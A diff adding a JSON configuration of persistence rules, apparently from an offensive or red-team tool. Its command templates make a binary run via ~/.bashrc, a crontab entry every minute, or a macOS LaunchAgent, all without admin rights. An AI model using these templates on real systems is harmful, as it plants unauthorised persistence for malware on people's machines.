@@ -1,0 +1,28 @@
+{
+  "rules": [
+    {
+      "name": "custom_bash_rc",
+      "platforms": ["linux", "macos"],
+      "method": "shell_profile",
+      "requires_admin": false,
+      "command_template": "echo '{binary_path}' >> ~/.bashrc",
+      "description": "Add to .bashrc for shell persistence"
+    },
+    {
+      "name": "custom_crontab",
+      "platforms": ["linux", "macos"],
+      "method": "cron",
+      "requires_admin": false,
+      "command_template": "(crontab -l 2>/dev/null; echo '* * * * * {binary_path}') | crontab -",
+      "description": "Crontab entry with custom interval (every minute)"
+    },
+    {
+      "name": "custom_launchd",
+      "platforms": ["macos"],
+      "method": "launchd",
+      "requires_admin": false,
+      "command_template": "mkdir -p \"$HOME/Library/LaunchAgents\" && cat > \"$HOME/Library/LaunchAgents/{name}.plist\" << 'PLIST'\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n  <key>Label</key>\n  <string>{name}</string>\n  <key>ProgramArguments</key>\n  <array>\n    <string>{binary_path}</string>\n  </array>\n  <key>RunAtLoad</key>\n  <true/>\n</dict>\n</plist>\nPLIST\nlaunchctl load \"$HOME/Library/LaunchAgents/{name}.plist\"",
+      "description": "macOS LaunchAgent persistence"
+    }
+  ]
+}
